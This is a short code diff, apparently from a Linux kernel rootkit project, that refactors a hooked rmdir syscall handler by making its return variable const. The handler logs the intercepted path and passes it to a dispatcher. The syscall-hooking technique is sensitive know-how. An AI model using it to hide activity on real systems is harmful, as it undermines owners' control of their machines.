@@ -25,12 +25,10 @@ asmlinkage long hook_rmdir(const struct pt_regs *regs) {
     const void *pathname = SYSCALL_ARG1(regs, void *);
     char *kernel_filename = duplicate_filename(pathname);
 
-    long ret;
-
     rk_info("[hook_rmdir] rmdir() hooked for: %s\n", kernel_filename);
 
     dispatcher(regs, kernel_filename);
-    ret = real_rmdir(regs);
+    const long ret = real_rmdir(regs);
 
     kfree(kernel_filename);
 
